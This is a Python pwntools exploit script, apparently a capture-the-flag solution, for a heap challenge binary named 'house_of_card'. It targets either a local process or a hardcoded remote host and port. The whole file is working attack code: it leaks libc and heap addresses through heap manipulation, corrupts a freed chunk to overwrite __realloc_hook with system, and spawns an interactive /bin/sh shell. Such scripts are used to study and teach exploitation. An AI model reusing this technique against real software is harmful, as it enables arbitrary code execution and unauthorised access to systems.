#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

count = 0

def new(name, size, desc):
    global count
    s.sendlineafter('    ⛩    ', '1')
    s.sendlineafter('Name :', name)
    s.sendlineafter('Len?', str(size))
    s.sendlineafter('Description:\n', desc)
    count += 1

def edit(index, name, size, desc):
    s.sendlineafter('    ⛩    ', '2')
    s.sendlineafter('>', str(index))
    s.sendlineafter('New name?', name)
    s.sendlineafter('Len?', str(size))
    s.sendline(desc)

def delete(index):
    global count
    s.sendlineafter('    ⛩    ', '3')
    s.sendlineafter('>', str(index))
    count -= 1

def show(index):
    s.sendlineafter('    ⛩    ', '2')
    s.recvuntil('[%d]' % index)
    s.recvuntil('Description :\n\t\t')
    ret = s.recvuntil('....(')[:-5]
    s.sendlineafter('>', str(count + 1))
    return ret

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./house_of_card', env = {'LD_PRELOAD': './libc.so'})
    else:
        s = remote('178.128.87.12', 31336)

    libc = ELF('./libc.so')

    new('A', 0x100, 'A' * 8)
    new('A', 0x80, 'A' * 8)
    new('A', 0x80, 'A' * 8)
    new('A', 0x80, 'A' * 8)
    new('A', 0x80, 'A' * 8)
    delete(4)
    delete(2)
    new('A', 0xc8, '')
    res = show(4)
    libc_base = u64(res[:0x8]) - 0x3c1b00
    log.info('libc base: %#x' % libc_base)
    heap_base = u64(res[0x8:0x10]) - 0x260
    log.info('heap base: %#x' % heap_base)
    delete(1)
    delete(1)
    delete(1)
    delete(1)

    new('A', 0x100, 'A')
    new('A', 0x110, 'A')
    new('A', 0x90, 'A')
    edit(3, 'A', 0x80, 'A')
    edit(3, 'A', 0x90, 'A' * 0x94 + p64(0x21) + p64(libc_base + libc.symbols['__realloc_hook'] - 0x8))
    edit(3, '/bin/sh\0' + p64(libc_base + libc.symbols['system']), 0x100, '')

    s.interactive()
